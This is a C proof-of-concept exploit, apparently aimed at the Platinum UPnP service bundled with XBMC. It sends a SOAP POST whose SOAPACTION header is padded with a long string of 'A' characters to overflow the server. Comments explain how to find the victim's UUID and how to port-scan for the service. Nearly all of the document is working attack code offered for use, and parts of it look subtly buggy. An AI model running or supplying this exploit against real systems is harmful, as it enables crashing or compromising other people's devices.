#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
 
/*
'''          !!IMPORTATNT!!                      
The UUID must be set i've hardcoded this
to make it easy to replace with the victim UUID
you can get the UUID number from the server
by issuing a get request to the vulnerable server
on port 00000 you can use a web browser to do this.
example = http://127.0.0.1:00000
 
 
-Note-
Just a side note the port is random and once the xbmc
application is installed the UUID will be set up along
with the port number at installation so you will have to
do a port scan to find what port the service is running
on but once its found it will be on that port till it
is reinstalled.Also the UUID will stay the same.
 
Universally Unique Identifier
---------------------------------------------------
XML example
<UDN>
uuid:0970aa46-ee68-3174-d548-44b656447658
</UDN>
---------------------------------------------------
-Note-
 
I was not going to write an xml paraser just for this
when a web browser and a set of eyes can do it.:)
 
Platinum UPnP SDK
http://www.plutinosoft.com/platinum
http://sourceforge.net/users/c0diq
'''
*/
//compiled using gcc on linux.
//Cygwin on windows.
 
void error(char *mess)
{
    perror(mess);
    exit(1);
}
 
int main(int argc, char *argv[])
{
    int sock;
    int input;
     
    struct sockaddr_in http_client;
    char buf[2000];
 
    unsigned int http_len;
     
 
    /* If there is more than 2 arguments passed print usage!!*/
    if (argc != 3)
    {
        fprintf(stderr,"USAGE: Server_ip port\n");
        exit(1);
    }
 
    /* Create socket */
    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    {
        error("Cant create socket");
    }
 
 
    /* Construct sockaddr */
    memset(&http_client, 0, sizeof(http_client));
    http_client.sin_family = AF_INET;
    http_client.sin_addr.s_addr = inet_addr(argv[1]);
    http_client.sin_port = htons(atoi(argv[2]));
 
    /* Establish connection */
    if (connect(sock,
                (struct sockaddr *) &http_client,
                sizeof(http_client)) < 0)
    {
        error("Failed to connect with remote host");
    }
 
       //Build the upnp equest
        memcpy(buf, "POST /AVTransport/ ", 18);
        memcpy(buf+18, "0970aa46-ee68-3174-d548-44b656447658", 36); //Replace with uuid of the vulnerable server #
        memcpy(buf+54, "/control.xml HTTP/1.1\r\n", 79);
        strcat(buf, "SOAPACTION: \x22urn:schemas-upnp-org:service:AVTransport:1#");
        strcat(buf,
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAA\r\n"
                 "CONTENT-TYPE:text/xml; charset=\x22utf-8\x22\r\n"
                 "HOST: 192.168.1.2:26125\r\n"
                 "Content-Length: 345");
                  
                 /* Send our request to the server*/
    http_len = strlen(buf);
    if (send(sock, buf, http_len, 0) != http_len)
    close(sock);
    exit(0);
}
 